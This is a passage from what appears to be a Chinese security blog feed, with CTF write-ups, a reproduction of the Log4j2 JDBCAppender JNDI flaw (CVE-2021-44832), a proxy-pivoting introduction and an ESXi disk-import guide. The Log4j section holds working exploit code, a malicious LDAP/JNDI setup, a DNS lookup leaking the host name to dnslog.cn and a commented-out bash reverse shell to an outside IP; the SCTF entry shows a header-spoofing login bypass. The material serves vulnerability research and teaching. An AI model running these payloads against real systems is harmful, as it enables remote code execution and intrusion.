alt="image-20220215164654261">成功获取base64值解密得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9</span><br><span class="line"> </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;WRONG WAY!&quot;</span>;</span><br><span class="line"><span class="comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境地址&quot;&gt;&lt;a href=&quot;#环境地址&quot; class=&quot;headerlink&quot; title=&quot;环境地址&quot;&gt;&lt;/a&gt;环境地址&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;61.147.171.107:10081&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61.147.171.107:10082&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61.147.171.107:10083&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="面试题" scheme="http://www.greetdawn.top/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</title>
    <link href="http://www.greetdawn.top/2021/12/29/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/"/>
    <id>http://www.greetdawn.top/2021/12/29/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/</id>
    <published>2021-12-29T02:34:17.000Z</published>
    <updated>2022-02-25T16:27:06.034Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前期<code>log4j2</code>存在的远程代码执行漏洞<code>（CVE-2021-44228）</code>引起了轩然大波。昨天上网冲浪发现，<code>checkmark</code>研究员<code>YANIV NIZRY</code>公布了新版本<code>log4j2 2.17.0</code>中存在基于<code>JDBCAPPENDER</code>配置文件的任意命令执行。且该漏洞已经公布其<code>CVE</code>编号为<code>CVE-2021-44832</code>。</p></blockquote><span id="more"></span><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><code>log4j2</code>在进行<code>JDBC</code>反序列化之前，可以通过<code>JNDI</code>动态远程获取数据库源文件。官方配置文档的格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;java:/comp/env/jdbc/LoggingDataSource&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Column</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">JDBC</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以尝试控制任意<code>LDAP</code>的<code>URL</code>,而达成对应的利用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><p>本地获取<code>2.17.0</code>版本<code>log4j2</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-rce<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>n</span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;3.1&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接借助<code>CVE-2021-44228 poc</code>来进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4j2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://192.168.1.81:8000/config.xml&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger(Log4j2.class);</span><br><span class="line"></span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            str = sc.nextLine();</span><br><span class="line">            logger.error(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地提供一个<code>config.xml</code>的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;dns://$&#123;env:COMPUTERNAME&#125;.mya9m5.dnslog.cn/exp&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;eventDate&quot;</span> <span class="attr">isEventTimestamp</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%level&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;logger&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%logger&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%message&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;exception&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%ex&#123;full&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">JDBC</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;warn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;databaseAppender&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行后接收请求:</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229112453677.png" alt="image-20211229112453677"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>编写一个<code>exp</code>攻击，发起弹出计算机的命令，并且本地编译成恶意<code>class</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// System.out.print(&quot;正在执行命令&quot;);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// String[] commands = &#123;&quot;bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;&#125;;</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;Calc&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            System.out.println(<span class="string">&quot;正在执行命令&quot;</span>);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意exp类文件目录下开启简易http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png" alt="image-20211229113202656"></p><p>恶意config.xml文件目录下开启简易http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113036815.png" alt="image-20211229113036815"></p><p>使用<code>marshalsec</code>启动恶意<code>ldap</code>服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.81:8001/#exp&quot;</span> 7788</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png"></p><p>修改<code>config.xml</code>文件<code>DataSource</code>为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://192.168.1.81:7788/exp&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>运行<code>Log4j2.java</code>触发恶意代码执行：</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113604804.png" alt="image-20211229113604804"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞利用之处比较鸡肋，你需要能够拥有修改本地<code>config</code>文件的权限才能达成对应的利用，因此其影响面相对较窄。但是出于安全考虑，还是建议将其更新至最新版本.</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></p><p>将 <code>Apache Log4j2 </code>升级到 2.17.1、2.12.4 和 2.3.2 或更高版本。</p><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul><li><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前期&lt;code&gt;log4j2&lt;/code&gt;存在的远程代码执行漏洞&lt;code&gt;（CVE-2021-44228）&lt;/code&gt;引起了轩然大波。昨天上网冲浪发现，&lt;code&gt;checkmark&lt;/code&gt;研究员&lt;code&gt;YANIV NIZRY&lt;/code&gt;公布了新版本&lt;code&gt;log4j2 2.17.0&lt;/code&gt;中存在基于&lt;code&gt;JDBCAPPENDER&lt;/code&gt;配置文件的任意命令执行。且该漏洞已经公布其&lt;code&gt;CVE&lt;/code&gt;编号为&lt;code&gt;CVE-2021-44832&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="log4j2" scheme="http://www.greetdawn.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之代理转发</title>
    <link href="http://www.greetdawn.top/2021/12/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    <id>http://www.greetdawn.top/2021/12/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</id>
    <published>2021-12-28T06:16:20.000Z</published>
    <updated>2022-02-25T16:37:11.228Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在日常渗透测试过程中，当我们<code>getshell</code>一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。</p></blockquote><span id="more"></span><h2 id="代理的分类"><a href="#代理的分类" class="headerlink" title="代理的分类"></a>代理的分类</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>代理服务器位于客户端和服务端之间的一台服务器，且<code>proxy</code>和<code>client</code>同属于一个区域，对<code>server</code>是透明的；其作用是从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。（类似于现实生活中的中介）</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228145340108.png" alt="image-20211228145340108"></p><p><strong>运行流程：</strong>客户端——请求——&gt; 代理服服务器——请求——&gt; 服务端</p><p><strong>代理特点：</strong></p><ul><li>客户端无法直接访问到服务端的目标应用，但是代理服务器可以。（典型场景：<code>FANQIANG</code>）</li><li>代理服务器帮助客户端请求页面并缓存在本地，并将页面返回到客户端</li><li>客户端需要设置代理服务器地址和端口（插件化），客户端知道代理服务器的存在</li><li>本质上代理服务器代理了客户端去和服务端请求交互的任务</li></ul><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>以代理服务器来接收网络连接请求，然后将请求转发给内部网络上的服务器，并将服务器上得到的结果返回给网络上请求连接的客户端。代理服务器和服务端共处于一个区域中，对客户端是透明的。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228160014598.png" alt="image-20211228160014598"></p><p><strong>代理特点：</strong></p><ul><li>客户端不清楚服务端是否存在代理服务器，以为请求的代理服务器就是真正的服务端</li><li>代理服务器将服务端页面缓存到本地，当客户端请求时直接返回给客户端</li><li>客户端无需任何配置，且不知道真实服务端的存在</li><li>应用场景：隐藏服务端真实<code>IP</code>、负载均衡、提高访问速度、增强安全性</li></ul><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a><code>lcx</code></h3>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在日常渗透测试过程中，当我们&lt;code&gt;getshell&lt;/code&gt;一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代理转发" scheme="http://www.greetdawn.top/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>关于VMware磁盘镜像导入ESXi的方法</title>
    <link href="http://www.greetdawn.top/2021/12/27/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.greetdawn.top/2021/12/27/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2021-12-27T06:15:17.000Z</published>
    <updated>2022-02-25T16:40:22.780Z</updated>
    
    <content type="html"><![CDATA[<p>关于VMware ESXi环境的磁盘迁移问题</p><span id="more"></span><h2 id="多磁盘格式"><a href="#多磁盘格式" class="headerlink" title="多磁盘格式"></a>多磁盘格式</h2><p>首先将多个磁盘进行合并处理，使用<code>vmware</code>自带的<code>vmware-vdiskmanager.exe</code>工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;D:\InstallSoftware\VMware\VMware Workstation\vmware-vdiskmanager.exe&quot;</span> -r <span class="string">&quot;Windows Server 2008 R2 x64.vmdk&quot;</span> -t 0 ATT01-win2008.vmdk</span><br></pre></td></tr></table></figure><h2 id="单磁盘"><a href="#单磁盘" class="headerlink" title="单磁盘"></a>单磁盘</h2><p>单磁盘比较简单，直接找到虚拟机<code>vmdk</code>文件即可</p><h2 id="ESXi操作"><a href="#ESXi操作" class="headerlink" title="ESXi操作"></a><code>ESXi</code>操作</h2><p>首先创建一个对应镜像格式的虚拟机</p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211227144938346.png" alt="image-20211227144938346" style="zoom: 67%;" /><p>创建成功后，删除该镜像的默认<code>vmdk</code>文件</p><p>打开<code>ESXi</code>的ssh，使用<code>sftp</code>工具连接上传镜像文件</p><p>上传路径<code>/vmfs/volumes/datastore1/</code></p><p>由于<code>vmware</code>的磁盘镜像格式和<code>ESXi</code>的有所不同，需要使用<code>ESXi</code>的<code>vmkfstools</code>工具进行转换</p><p>转换生成的镜像名称和刚刚创建的虚拟机镜像名保持一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk</span><br></pre></td></tr></table></figure><p>将转换后的磁盘移动到对应虚拟机的目录下</p><p>也可以先创建虚拟机，再上传磁盘到虚拟机目录下，再对其进行转换即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于VMware ESXi环境的磁盘迁移问题&lt;/p&gt;</summary>
    
    
    
    <category term="环境配置" scheme="http://www.greetdawn.top/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="VMware ESXi" scheme="http://www.greetdawn.top/tags/VMware-ESXi/"/>
    
  </entry>
  
  <entry>
    <title>SCTF2021</title>
    <link href="http://www.greetdawn.top/2021/12/25/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/SCTF2021/"/>
    <id>http://www.greetdawn.top/2021/12/25/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/SCTF2021/</id>
    <published>2021-12-25T02:21:09.000Z</published>
    <updated>2022-02-25T16:29:23.219Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p><span id="more"></span><p>团队在SCTF中喜获两枚<code>flag</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="loginme"><a href="#loginme" class="headerlink" title="loginme"></a>loginme</h2><p>下载源码发现是go语言的web框架题</p><p>其实对go一点不熟，之前也没有学过，很难受，那就现场学习一下吧</p><p>首先需要本地登录</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102304811.png" alt="image-20211225102304811"></p><p>但是源码要求x-forwarded-for和x-client-ip均为空</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102411236.png" alt="image-20211225102411236"></p><p>搜gin模块ClientIP()的使用方法发现默认方法有[X-Forwarded-For, X-Real-Ip]</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102526951.png" alt="image-20211225102526951"></p><p>那直接构造请求包参数X-Real-Ip:127.0.0.1成功登录</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225102652833.png" alt="image-20211225102652833"></p><p>分析route.go源码中Login方法逻辑保证传入id参数为0，可以取到admin的信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 